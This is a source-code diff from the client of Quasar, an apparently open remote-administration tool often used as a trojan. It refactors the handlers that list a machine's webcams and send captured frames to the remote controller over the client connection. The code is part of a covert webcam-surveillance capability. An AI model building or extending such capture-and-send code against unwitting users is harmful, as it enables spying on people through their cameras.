@@ -4,9 +4,9 @@ using System.Drawing.Imaging;
 using System.IO;
 using AForge.Video;
 using AForge.Video.DirectShow;
+using Quasar.Common.Messages;
+using Quasar.Common.Video;
 using xClient.Core.Networking;
-using xClient.Core.Packets.ClientPackets;
-using xClient.Core.Packets.ServerPackets;
 
 namespace xClient.Core.Commands
 {
@@ -23,7 +23,7 @@ namespace xClient.Core.Commands
 
         public static void HandleGetWebcams(GetWebcams command, Client client)
         {
-            var deviceInfo = new Dictionary<string, List<Size>>();
+            var deviceInfo = new Dictionary<string, List<Resolution>>();
             var videoCaptureDevices = new FilterInfoCollection(FilterCategory.VideoInputDevice);
             foreach (FilterInfo videoCaptureDevice in videoCaptureDevices)
             {
@@ -33,10 +33,15 @@ namespace xClient.Core.Commands
                 {
                     supportedResolutions.Add(resolution.FrameSize);
                 }
-                deviceInfo.Add(videoCaptureDevice.Name, supportedResolutions);
+                List<Resolution> res = new List<Resolution>(supportedResolutions.Count);
+                foreach (var r in supportedResolutions)
+                    res.Add(new Resolution {Height = r.Height, Width = r.Width});
+
+                deviceInfo.Add(videoCaptureDevice.Name, res);
             }
+
             if (deviceInfo.Count > 0)
-                new GetWebcamsResponse(deviceInfo).Execute(client);
+                client.Send(new GetWebcamsResponse {Webcams = deviceInfo});
         }
 
         public static void HandleGetWebcam(GetWebcam command, Client client)
@@ -80,7 +85,12 @@ namespace xClient.Core.Commands
                 using (var stream = new MemoryStream())
                 {
                     image.Save(stream, ImageFormat.Bmp);
-                    new GetWebcamResponse(stream.ToArray(), Webcam, Resolution).Execute(Client);
+                    Client.Send(new GetWebcamResponse
+                    {
+                        Image = stream.ToArray(),
+                        Webcam = Webcam,
+                        Resolution = Resolution
+                    });
                     stream.Close();
                 }
                 NeedsCapture = false;
